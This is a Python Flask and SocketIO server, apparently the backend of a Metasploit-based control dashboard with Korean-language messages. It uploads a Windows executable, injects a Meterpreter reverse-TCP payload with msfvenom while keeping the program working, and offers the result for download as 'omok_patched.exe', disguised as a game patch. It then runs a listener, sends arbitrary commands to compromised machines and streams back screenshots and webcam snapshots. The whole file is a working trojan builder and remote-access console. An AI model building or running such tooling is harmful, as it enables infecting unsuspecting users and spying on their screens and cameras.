import eventlet
eventlet.monkey_patch()

import os
import re
import uuid
import base64
import time
import logging
import subprocess
from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit

from config import (UPLOAD_DIR, MAX_UPLOAD_SIZE, ALLOWED_IMAGE_EXT,
                    ALLOWED_AUDIO_EXT, TOKEN_REFRESH_INTERVAL, LHOST, LPORT)
from msf_client import MsfClient

logging.basicConfig(level=logging.INFO)

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")

app = Flask(__name__,
            static_folder=os.path.join(FRONTEND_DIR, "static"),
            static_url_path="/static")
app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_SIZE

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
msf = MsfClient.get_instance()

os.makedirs(UPLOAD_DIR, exist_ok=True)

_last_sessions = {}
_listener_job_id = None


# ── 백그라운드 태스크 ─────────────────────────────────────────────────────────

def session_monitor():
    global _last_sessions
    while True:
        socketio.sleep(3)
        current = msf.get_sessions()
        if current != _last_sessions:
            _last_sessions = current
            socketio.emit("session_update", {"sessions": list(current.values())})
        if not msf.is_connected():
            socketio.emit("system_event", {"level": "error", "message": "MSF-RPC 연결 끊김"})


def token_refresh():
    while True:
        socketio.sleep(TOKEN_REFRESH_INTERVAL)
        if msf.is_connected():
            msf.reconnect()


# ── 유틸 ──────────────────────────────────────────────────────────────────────

def _encode_image_file(path):
    ext = path.rsplit(".", 1)[-1].lower()
    mime = "image/jpeg" if ext in ("jpg", "jpeg") else f"image/{ext}"
    with open(path, "rb") as f:
        data = base64.b64encode(f.read()).decode("ascii")
    return f"data:{mime};base64,{data}"


def _parse_saved_path(output):
    match = re.search(r'(?:saved to|Saved to)[:\s]+(\S+)', output, re.IGNORECASE)
    return match.group(1).strip() if match else None


# ── REST ──────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return send_from_directory(FRONTEND_DIR, "dashboard.html")


@app.route("/api/status")
def api_status():
    return jsonify({
        "connected": msf.is_connected(),
        "session_count": len(msf.get_sessions()),
        "lhost": LHOST,
        "lport": LPORT,
    })


@app.route("/api/upload/image", methods=["POST"])
def upload_image():
    if "file" not in request.files:
        return jsonify({"error": "파일 없음"}), 400
    f = request.files["file"]
    ext = f.filename.rsplit(".", 1)[-1].lower() if f.filename and "." in f.filename else ""
    if ext not in ALLOWED_IMAGE_EXT:
        return jsonify({"error": f"허용되지 않는 확장자: {ext}"}), 400
    path = os.path.join(UPLOAD_DIR, f"{uuid.uuid4()}.{ext}")
    f.save(path)
    return jsonify({"file_path": path})


@app.route("/api/upload/audio", methods=["POST"])
def upload_audio():
    if "file" not in request.files:
        return jsonify({"error": "파일 없음"}), 400
    f = request.files["file"]
    ext = f.filename.rsplit(".", 1)[-1].lower() if f.filename and "." in f.filename else ""
    if ext not in ALLOWED_AUDIO_EXT:
        return jsonify({"error": f"허용되지 않는 확장자: {ext}"}), 400
    path = os.path.join(UPLOAD_DIR, f"{uuid.uuid4()}.{ext}")
    f.save(path)
    return jsonify({"file_path": path})


# ── REST: 페이로드 생성 ───────────────────────────────────────────────────────

@app.route("/api/payload/upload", methods=["POST"])
def upload_template_exe():
    if "file" not in request.files:
        return jsonify({"error": "파일 없음"}), 400
    f = request.files["file"]
    if not f.filename or not f.filename.lower().endswith(".exe"):
        return jsonify({"error": ".exe 파일만 가능"}), 400
    path = os.path.join(UPLOAD_DIR, f"tmpl_{uuid.uuid4()}.exe")
    f.save(path)
    return jsonify({"template_path": path, "original_name": f.filename})


@app.route("/api/payload/download/<filename>")
def download_payload(filename):
    safe = os.path.basename(filename)
    if not safe.startswith("infected_") or not safe.endswith(".exe"):
        return jsonify({"error": "허용되지 않는 파일"}), 403
    path = os.path.join(UPLOAD_DIR, safe)
    if not os.path.exists(path):
        return jsonify({"error": "파일 없음"}), 404
    return send_from_directory(UPLOAD_DIR, safe, as_attachment=True,
                               download_name="omok_patched.exe")


# ── msfvenom 백그라운드 작업 ──────────────────────────────────────────────────

def _inject_task(sid, template_path, output_path, output_name, lhost, lport):
    def _run():
        import subprocess as sp
        cmd = [
            "msfvenom",
            "-p", "windows/meterpreter/reverse_tcp",
            f"LHOST={lhost}", f"LPORT={lport}",
            "-x", template_path,
            "-k",
            "-f", "exe",
            "-o", output_path,
        ]
        return sp.run(cmd, capture_output=True, text=True, timeout=180)

    try:
        result = eventlet.tpool.execute(_run)
        try:
            os.remove(template_path)
        except OSError:
            pass

        if result.returncode == 0 and os.path.exists(output_path):
            socketio.emit("injection_complete", {
                "filename": output_name,
                "download_url": f"/api/payload/download/{output_name}",
                "lhost": lhost,
                "lport": lport,
            }, room=sid)
        else:
            err = (result.stderr or result.stdout or "msfvenom 오류").strip()
            socketio.emit("injection_error", {"message": err}, room=sid)
    except Exception as e:
        socketio.emit("injection_error", {"message": str(e)}, room=sid)


# ── WebSocket ─────────────────────────────────────────────────────────────────

def _emit_listener_status(running, job_id=None, message=None, to=None):
    payload = {"running": running, "job_id": job_id, "lhost": LHOST, "lport": LPORT}
    if message:
        payload["message"] = message
    if to:
        socketio.emit("listener_status", payload, room=to)
    else:
        socketio.emit("listener_status", payload)


@socketio.on("connect")
def on_connect():
    global _listener_job_id
    if not msf.is_connected():
        ok = msf.connect()
        if not ok:
            emit("system_event", {"level": "error", "message": "MSF-RPC 연결 실패 — msfrpcd 실행 여부 확인"})
    sessions = msf.get_sessions()
    emit("session_update", {"sessions": list(sessions.values())})
    emit("system_event", {"level": "info", "message": f"대시보드 연결됨 — LHOST: {LHOST}:{LPORT}"})
    # verify listener job still alive
    if _listener_job_id is not None:
        jobs = msf.get_jobs()
        if str(_listener_job_id) not in {str(k) for k in jobs.keys()}:
            _listener_job_id = None
    _emit_listener_status(_listener_job_id is not None, _listener_job_id, to=request.sid)


@socketio.on("request_sessions")
def on_request_sessions():
    emit("session_update", {"sessions": list(msf.get_sessions().values())})


@socketio.on("run_command")
def on_run_command(data):
    """세션에 Meterpreter 명령어를 그대로 전송"""
    session_id = data.get("session_id")
    command = (data.get("command") or "").strip()
    ts = int(time.time() * 1000)

    if not session_id:
        emit("cmd_result", {"success": False, "command": command, "output": "세션을 먼저 선택하세요", "timestamp": ts})
        return
    if not command:
        return

    try:
        output = msf.run_command(session_id, command, timeout=30) or ""

        # screenshot / webcam_snap → 이미지 반환
        cmd_lower = command.strip().split()[0].lower()
        if cmd_lower in ("screenshot", "webcam_snap"):
            path = _parse_saved_path(output)
            if path and os.path.exists(path):
                emit("image_data", {
                    "command": command,
                    "data": _encode_image_file(path),
                    "timestamp": ts,
                })
                return

        emit("cmd_result", {"success": True, "command": command, "output": output.strip(), "timestamp": ts})

    except Exception as e:
        emit("cmd_result", {"success": False, "command": command, "output": str(e), "timestamp": ts})


@socketio.on("kill_all")
def on_kill_all():
    ts = int(time.time() * 1000)
    success = msf.kill_all_sessions()
    msg = "전체 세션 종료 완료" if success else "세션 종료 실패"
    socketio.emit("system_event", {"level": "info" if success else "error", "message": msg, "timestamp": ts})
    if success:
        socketio.emit("session_update", {"sessions": []})


@socketio.on("kill_port")
def on_kill_port():
    ts = int(time.time() * 1000)
    try:
        subprocess.run(["fuser", "-k", "-n", "tcp", str(LPORT)], check=False)
        emit("system_event", {"level": "info", "message": f"포트 {LPORT} 강제 종료됨", "timestamp": ts})
    except Exception as e:
        emit("system_event", {"level": "error", "message": f"포트 종료 실패: {e}", "timestamp": ts})


@socketio.on("start_listener")
def on_start_listener():
    global _listener_job_id
    if _listener_job_id is not None:
        emit("listener_status", {"running": True, "job_id": _listener_job_id, "lhost": LHOST, "lport": LPORT,
                                  "message": f"이미 실행 중 (job {_listener_job_id})"})
        return
    job_id, err = msf.start_listener(LHOST, LPORT)
    if err:
        emit("system_event", {"level": "error", "message": f"리스너 시작 실패: {err}"})
        _emit_listener_status(False, None, f"시작 실패: {err}", to=request.sid)
    else:
        _listener_job_id = job_id
        _emit_listener_status(True, job_id, f"리스너 시작됨 — {LHOST}:{LPORT} (job {job_id})")


@socketio.on("stop_listener")
def on_stop_listener(data):
    global _listener_job_id
    job_id = data.get("job_id", _listener_job_id)
    if job_id is None:
        emit("listener_status", {"running": False, "job_id": None, "lhost": LHOST, "lport": LPORT})
        return
    ok, err = msf.stop_listener(job_id)
    if ok:
        _listener_job_id = None
        _emit_listener_status(False, None, f"리스너 중지됨 (job {job_id})")
    else:
        emit("system_event", {"level": "error", "message": f"리스너 중지 실패: {err}"})


@socketio.on("inject_payload")
def on_inject_payload(data):
    sid = request.sid
    template_path = data.get("template_path", "")
    if not template_path or not os.path.exists(template_path):
        emit("injection_error", {"message": "템플릿 파일 없음. 다시 업로드하세요."})
        return
    output_name = f"infected_{uuid.uuid4()}.exe"
    output_path = os.path.join(UPLOAD_DIR, output_name)
    emit("injection_progress", {"message": f"msfvenom 실행 중... LHOST={LHOST}:{LPORT} (30~60초 소요)"})
    socketio.start_background_task(_inject_task, sid, template_path, output_path, output_name, LHOST, LPORT)


if __name__ == "__main__":
    connected = msf.connect()
    if not connected:
        print("[!] MSF-RPC 연결 실패. msfrpcd가 실행 중인지 확인하세요.")
    print(f"[*] LHOST 자동 감지: {LHOST}:{LPORT}")
    socketio.start_background_task(session_monitor)
    socketio.start_background_task(token_refresh)
    socketio.run(app, host="0.0.0.0", port=5000, debug=False)
